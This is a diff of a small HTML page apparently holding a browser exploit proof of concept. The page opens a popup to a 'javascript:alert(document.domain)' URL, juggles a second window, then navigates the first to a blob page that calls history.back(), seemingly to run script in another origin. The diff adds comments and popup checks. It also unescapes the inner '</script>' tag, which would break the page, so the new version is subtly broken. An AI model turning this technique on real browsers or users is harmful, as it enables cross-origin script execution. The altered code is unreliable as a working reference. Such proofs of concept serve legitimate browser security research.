@@ -8,21 +8,31 @@
 <body>
   <h1>hello</h1>
   <script>
-  const win = window.open(`javascript:alert(document.domain);`)
+    // Open the first window and show an alert
+    const win = window.open('javascript:alert(document.domain);');
+    if (!win) {
+      alert('Popup blocked');
+    }
 
-  setTimeout(() => {
-    const win2 = window.open(``)
+    // After 1 second, open a second window and perform actions on it
     setTimeout(() => {
-      win2.close()
-      win.location = URL.createObjectURL(new Blob([`
-        <script>
-          setTimeout(() => {
-           history.back();
-          }, 500);
-        <\/script>
-      `], { type: "text/html" }));
-    }, 1000)
-  }, 1000)
-</script>
+      const win2 = window.open(''); // Open an empty window
+      if (!win2) {
+        alert('Popup blocked');
+      }
+
+      // After 1 second, close the second window and inject a script
+      setTimeout(() => {
+        win2.close();
+        win.location = URL.createObjectURL(new Blob([`
+          <script>
+            setTimeout(() => {
+              history.back();
+            }, 500);
+          </script>
+        `], { type: 'text/html' }));
+      }, 1000);
+    }, 1000);
+  </script>
 </body>
 </html>
